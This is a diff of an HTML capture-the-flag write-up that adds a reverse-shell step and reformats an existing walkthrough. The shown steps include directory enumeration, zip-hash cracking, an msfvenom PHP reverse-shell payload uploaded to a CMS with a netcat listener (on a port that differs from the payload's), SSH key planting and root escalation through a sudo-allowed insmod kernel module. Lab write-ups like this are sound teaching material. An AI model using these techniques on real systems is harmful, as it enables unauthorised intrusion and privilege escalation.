@@ -372,20 +372,20 @@
   }
 
   .step-number {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  width: 36px;
-  height: 36px;
-  background-color: #7B1113;
-  box-shadow: 0 0 10px rgba(123, 17, 19, 0.5);
-  color: white;
-  border-radius: 50%;
-  margin-right: 15px;
-  font-weight: bold;
-  font-size: 1.2rem;
-  font-family: 'DejaVu Sans Mono', monospace;
-}
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 36px;
+    height: 36px;
+    background-color: #7B1113;
+    box-shadow: 0 0 10px rgba(123, 17, 19, 0.5);
+    color: white;
+    border-radius: 50%;
+    margin-right: 15px;
+    font-weight: bold;
+    font-size: 1.2rem;
+    font-family: 'DejaVu Sans Mono', monospace;
+  }
 
   .writeup-text code {
     background-color: rgba(123, 17, 19, 0.2);
@@ -559,10 +559,10 @@
         <h3 class="step-title"><span class="step-number">3</span> Directory Enumeration</h3>
         
         <p class="writeup-text">
-          Next, I used Gobuster for directory enumeration, which is an effective way to discover hidden directories on a website. By running the following command:
+          Next, I used <strong>Gobuster</strong> for directory enumeration, which is an effective way to discover hidden directories on a website. By running the following command:
           <br><code>gobuster dir -u http://10.10.237.26 -w /usr/share/wordlists/dirb/common.txt</code>
           <br><br>
-          I discovered the /backups directory, which contained an important file, breakglass.zip. I found that this file was password-protected.
+          I discovered the /backups directory, which contained an important file, <strong>breakglass.zip</strong>. I found that this file was password-protected.
         </p>
         
         <div class="image-container">
@@ -575,9 +575,9 @@
         <h3 class="step-title"><span class="step-number">4</span> Password Cracking</h3>
         
         <p class="writeup-text">
-          I proceeded to download the breakglass.zip file using wget and extracted it with the unzip command. Inside the archive, I found a file called recovery.txt, which contained an MD5 hash of the admin user's password.
+          I proceeded to download the <strong>breakglass.zip</strong> file using wget and extracted it with the unzip command. Inside the archive, I found a file called <strong>recovery.txt</strong>, which contained an MD5 hash of the admin user's password.
           <br><br>
-          To crack the hash, I used the zip2john and John the Ripper tools:
+          To crack the hash, I used the <strong>zip2john</strong> and <strong>John the Ripper</strong> tools:
           <br><code>zip2john breakglass.zip > ziphash.txt</code>
           <br><code>john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt</code>
           <br><br>
@@ -608,41 +608,47 @@
         </div>
       </div>
 
-      <!-- Vaihe 6: SSH Key Creation -->
+      <!-- Vaihe 6: Msfvenom Reverse Shell -->
       <div class="challenge-section">
-        <h3 class="step-title"><span class="step-number">6</span> SSH Key Creation</h3>
+        <h3 class="step-title"><span class="step-number">6</span> Reverse Shell Creation</h3>
         
         <p class="writeup-text">
-          Next, I generated an SSH key pair to enable SSH access to the target machine. The command I used was:
-          <br><code>ssh-keygen -t rsa -b 4096 -f mykey</code>
+          I used <strong>msfvenom</strong> to create a reverse shell PHP payload with the following command:
+          <br><code>msfvenom -p php/reverse_php LHOST=10.10.43.8 LPORT=4444 -f raw > shell.inc</code>
           <br><br>
-          Afterward, I added the public key to the /home/void/.ssh/authorized_keys file on the target machine, allowing me to log in as the void user via SSH.
+          Then, I uploaded the <strong>shell.inc</strong> file to the <strong>Media</strong> directory within the CMS. After uploading the reverse shell, I set up a listener on my attacker machine to catch the incoming shell connection using <strong>Netcat</strong>.
           <br><br>
-          I successfully logged into the target machine as the void user via SSH using the following command:
-          <br><code>ssh -i mykey void@10.10.237.26</code>
+          I ran the command:
+          <br><code>nc -lvnp 8888</code>
           <br><br>
-          Once logged in, I accessed the user.txt flag, confirming that I had successfully compromised the user account.
+          This allowed me to establish a reverse shell connection with the target machine.
         </p>
         
         <div class="image-container">
-          <img src="images/avengershub7.png" alt="SSH Key Generation" class="challenge-image">
-        </div>
-        
-        <div class="image-container">
-          <img src="images/avengershub8.png" alt="SSH Key Generation" class="challenge-image">
+          <img src="images/avengershub7.png" alt="Reverse Shell Creation" class="challenge-image">
         </div>
       </div>
 
-      <!-- Vaihe 7: User Account Access -->
+      <!-- Vaihe 7: SSH Key Generation -->
       <div class="challenge-section">
-        <h3 class="step-title"><span class="step-number">7</span> User Account Access</h3>
+        <h3 class="step-title"><span class="step-number">7</span> SSH Key Authentication</h3>
         
         <p class="writeup-text">
-          After establishing SSH access, I was able to connect to the server and verify my access to the user's account.
+          Next, I generated an <strong>SSH key pair</strong> to enable SSH access to the target machine.
+          <br><br>
+          The command I used was:
+          <br><code>ssh-keygen -t rsa -b 4096 -f mykey</code>
+          <br><br>
+          Afterward, I added the public key to the <strong>/home/void/.ssh/authorized_keys</strong> file on the target machine, allowing me to log in as the <strong>void</strong> user via SSH.
+          <br><br>
+          I successfully logged into the target machine as the <strong>void</strong> user via SSH using the following command:
+          <br><code>ssh -i mykey void@10.10.237.26</code>
+          <br><br>
+          Once logged in, I accessed the <strong>user.txt</strong> flag, confirming that I had successfully compromised the user account.
         </p>
         
         <div class="image-container">
-          <img src="images/avengershub9.png" alt="SSH Access" class="challenge-image">
+          <img src="images/avengershub8.png" alt="SSH Access" class="challenge-image">
         </div>
       </div>
 
@@ -651,11 +657,11 @@
         <h3 class="step-title"><span class="step-number">8</span> Privilege Escalation Opportunity</h3>
         
         <p class="writeup-text">
-          Upon running the command <code>sudo -l</code>, I discovered that the void user could run the command <code>/sbin/insmod</code> without needing a password. This was a key opportunity for privilege escalation.
+          Upon running the command <code>sudo -l</code>, I discovered that the <strong>void</strong> user could run the command <code>/sbin/insmod</code> without needing a password. This was a key opportunity for privilege escalation.
         </p>
         
         <div class="image-container">
-          <img src="images/avengershub10.png" alt="Sudo Privileges" class="challenge-image">
+          <img src="images/avengershub9.png" alt="Sudo Privileges" class="challenge-image">
         </div>
       </div>
 
@@ -664,13 +670,13 @@
         <h3 class="step-title"><span class="step-number">9</span> Kernel Module Creation</h3>
         
         <p class="writeup-text">
-          I created the cyberavengers.c kernel module, which creates a SUID binary. This binary copies the /bin/bash executable to the /tmp/rootbash path and sets the SUID bit to give it root privileges.
+          I created the <strong>cyberavengers.c</strong> kernel module, which creates a <strong>SUID binary</strong>. This binary copies the /bin/bash executable to the /tmp/rootbash path and sets the SUID bit to give it root privileges.
           <br><br>
           After creating the module, I compiled it using the make command. Due to my attackbox crashing, I restarted it and re-ran the necessary steps to continue.
         </p>
         
         <div class="image-container">
-          <img src="images/avengershub11.png" alt="Kernel Module Creation" class="challenge-image">
+          <img src="images/avengershub10.png" alt="Kernel Module Creation" class="challenge-image">
         </div>
       </div>
 
@@ -682,13 +688,17 @@
           Once I had successfully compiled the module, I uploaded it to the target machine using:
           <br><code>sudo /sbin/insmod cyberavengers.ko</code>
           <br><br>
-          I verified that the /tmp/rootbash binary was created and had the correct permissions to be executed as root.
+          I verified that the <strong>/tmp/rootbash</strong> binary was created and had the correct permissions to be executed as root.
           <br><br>
           I ran the SUID binary with the command:
           <br><code>/tmp/rootbash -p</code>
           <br><br>
           This gave me root privileges. I confirmed that I had root access by running the id command, which displayed that I was logged in as the root user.
         </p>
+        
+        <div class="image-container">
+          <img src="images/avengershub11.png" alt="Module Loading" class="challenge-image">
+        </div>
         
         <div class="image-container">
           <img src="images/avengershub12.png" alt="Root Privileges" class="challenge-image">
@@ -700,7 +710,7 @@
         <h3 class="step-title"><span class="step-number">✓</span> Flag Capture</h3>
         
         <p class="writeup-text">
-          Finally, I found the root flag from /root/root.txt by running the following command:
+          Finally, I found the root flag from <strong>/root/root.txt</strong> by running the following command:
           <br><code>cat /root/root.txt</code>
         </p>
         
@@ -715,7 +725,8 @@
         
         <div class="summary-content">
           <p class="writeup-text">
-            <strong>Overview:</strong> The Cyber Avengers' private server had been hijacked by an attacker named Cipher, who locked out legitimate users and left a malicious web shell behind. My mission was to retrace his steps, gain access to the compromised system, escalate privileges, and ultimately reclaim control by obtaining root access</p>
+            <strong>Overview:</strong> The Cyber Avengers' private server had been hijacked by an attacker named Cipher, who locked out legitimate users and left a malicious web shell behind. My mission was to retrace his steps, gain access to the compromised system, escalate privileges, and ultimately reclaim control by obtaining root access.
+          </p>
           
           <p class="writeup-text">
             <strong>What I learned:</strong> This provided solid hands-on practice and let me explore how these tools work together as part of a complete process.
